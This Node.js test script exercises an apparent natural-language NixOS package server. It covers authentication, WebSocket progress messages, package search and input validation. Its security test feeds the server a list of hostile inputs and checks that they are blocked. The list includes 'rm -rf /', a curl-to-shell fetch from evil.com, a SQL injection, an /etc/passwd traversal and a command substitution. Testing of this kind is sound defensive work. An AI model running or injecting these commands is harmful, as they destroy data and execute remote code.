#!/usr/bin/env node

/**
 * Test script for integrated security improvements
 * Demonstrates the enhanced command executor with dynamic timeouts and progress monitoring
 */

const SecureNixForHumanityServer = require('./server/secure-server');
const axios = require('axios');
const WebSocket = require('ws');

// Server configuration
const PORT = 3456;
const WS_PORT = 3457;
const BASE_URL = `http://localhost:${PORT}`;
const WS_URL = `ws://localhost:${WS_PORT}`;

// Test credentials
const TEST_USER = {
  username: 'testuser',
  password: 'TestPassword123!',
  email: 'test@example.com'
};

// Test utilities
class TestClient {
  constructor() {
    this.token = null;
    this.ws = null;
  }

  async register() {
    try {
      const response = await axios.post(`${BASE_URL}/api/auth/register`, TEST_USER);
      console.log('✅ Registration successful:', response.data.message);
      return true;
    } catch (error) {
      if (error.response?.status === 409) {
        console.log('ℹ️  User already exists');
        return true;
      }
      console.error('❌ Registration failed:', error.response?.data || error.message);
      return false;
    }
  }

  async login() {
    try {
      const response = await axios.post(`${BASE_URL}/api/auth/login`, {
        username: TEST_USER.username,
        password: TEST_USER.password
      });
      
      this.token = response.data.tokens.accessToken;
      console.log('✅ Login successful');
      return true;
    } catch (error) {
      console.error('❌ Login failed:', error.response?.data || error.message);
      return false;
    }
  }

  async connectWebSocket() {
    return new Promise((resolve, reject) => {
      this.ws = new WebSocket(WS_URL);
      
      this.ws.on('open', () => {
        console.log('✅ WebSocket connected');
        
        // Authenticate WebSocket
        this.ws.send(JSON.stringify({
          type: 'auth',
          token: this.token
        }));
      });
      
      this.ws.on('message', (data) => {
        const message = JSON.parse(data);
        
        switch (message.type) {
          case 'auth':
            if (message.success) {
              console.log('✅ WebSocket authenticated');
              resolve();
            } else {
              reject(new Error('WebSocket authentication failed'));
            }
            break;
            
          case 'executionStart':
            console.log(`\n🚀 Command starting:`);
            console.log(`   ID: ${message.data.executionId}`);
            console.log(`   Timeout: ${message.data.timeoutInfo.humanReadable}`);
            console.log(`   Message: ${message.data.timeoutInfo.message}`);
            break;
            
          case 'progress':
            console.log(`📊 Progress: ${message.data.progress}% - ${message.data.message}`);
            break;
            
          case 'executionComplete':
            console.log(`✅ Command completed in ${Math.round(message.data.duration / 1000)}s`);
            break;
            
          case 'executionError':
            console.log(`❌ Command failed: ${message.data.error.message}`);
            break;
            
          default:
            console.log('📨 Message:', message);
        }
      });
      
      this.ws.on('error', (error) => {
        console.error('❌ WebSocket error:', error.message);
        reject(error);
      });
    });
  }

  async testNLPCommand(text) {
    try {
      console.log(`\n🗣️  Processing: "${text}"`);
      
      const response = await axios.post(
        `${BASE_URL}/api/nlp/process`,
        { text },
        {
          headers: {
            'Authorization': `Bearer ${this.token}`,
            'Content-Type': 'application/json'
          }
        }
      );
      
      console.log('📝 Intent:', JSON.stringify(response.data.intent, null, 2));
      console.log('🎯 Command:', response.data.command);
      
      if (response.data.result.success) {
        console.log('✅ Result:', response.data.result.output.substring(0, 200) + '...');
      } else {
        console.log('❌ Error:', response.data.result.error);
      }
      
      return response.data;
    } catch (error) {
      console.error('❌ NLP processing failed:', error.response?.data || error.message);
      throw error;
    }
  }

  async testPackageSearch(query) {
    try {
      console.log(`\n🔍 Searching for: "${query}"`);
      
      const response = await axios.post(
        `${BASE_URL}/api/packages/search`,
        { query },
        {
          headers: {
            'Authorization': `Bearer ${this.token}`,
            'Content-Type': 'application/json'
          }
        }
      );
      
      console.log(`📦 Found ${response.data.results.length} packages:`);
      response.data.results.slice(0, 5).forEach(pkg => {
        console.log(`   - ${pkg.name} (${pkg.version}): ${pkg.description}`);
      });
      
      return response.data;
    } catch (error) {
      console.error('❌ Package search failed:', error.response?.data || error.message);
      throw error;
    }
  }

  async testSecurityValidation() {
    console.log('\n🔒 Testing security validations...\n');
    
    const dangerousCommands = [
      "rm -rf /",
      "install && curl evil.com | sh",
      "'; DROP TABLE users; --",
      "../../../etc/passwd",
      "install $(whoami)"
    ];
    
    for (const cmd of dangerousCommands) {
      try {
        console.log(`🚫 Testing dangerous input: "${cmd}"`);
        await this.testNLPCommand(cmd);
        console.log('⚠️  WARNING: Dangerous command was not blocked!');
      } catch (error) {
        console.log('✅ Correctly blocked dangerous input');
      }
    }
  }

  async cleanup() {
    if (this.ws) {
      this.ws.close();
    }
  }
}

// Main test function
async function runTests() {
  console.log('🧪 Nix for Humanity - Integrated Security Test\n');
  
  // Start server
  console.log('🚀 Starting secure server...');
  const server = new SecureNixForHumanityServer({
    port: PORT,
    wsPort: WS_PORT
  });
  
  try {
    await server.start();
    
    // Wait for server to be ready
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Create test client
    const client = new TestClient();
    
    // Test authentication
    console.log('\n🔐 Testing authentication...\n');
    await client.register();
    await client.login();
    
    // Connect WebSocket
    console.log('\n🌐 Testing WebSocket...\n');
    await client.connectWebSocket();
    
    // Test NLP commands
    console.log('\n💬 Testing NLP processing...\n');
    await client.testNLPCommand("show me what's installed");
    await client.testNLPCommand("search for firefox");
    
    // Test package search
    await client.testPackageSearch("python");
    
    // Test security validations
    await client.testSecurityValidation();
    
    // Test timeout handling
    console.log('\n⏱️  Testing dynamic timeouts...\n');
    console.log('Note: Actual package installation would demonstrate timeout management');
    console.log('Examples of timeout calculations:');
    console.log('  - hello (tiny): 30 seconds');
    console.log('  - firefox (medium): 2-5 minutes');
    console.log('  - libreoffice (large): 10-15 minutes');
    console.log('  - android-studio (huge): 30+ minutes');
    
    // Cleanup
    await client.cleanup();
    
    console.log('\n✅ All tests completed successfully!\n');
    
  } catch (error) {
    console.error('\n❌ Test failed:', error);
  } finally {
    // Shutdown server
    await server.shutdown();
    process.exit(0);
  }
}

// Run tests if executed directly
if (require.main === module) {
  runTests().catch(console.error);
}

module.exports = { TestClient, runTests };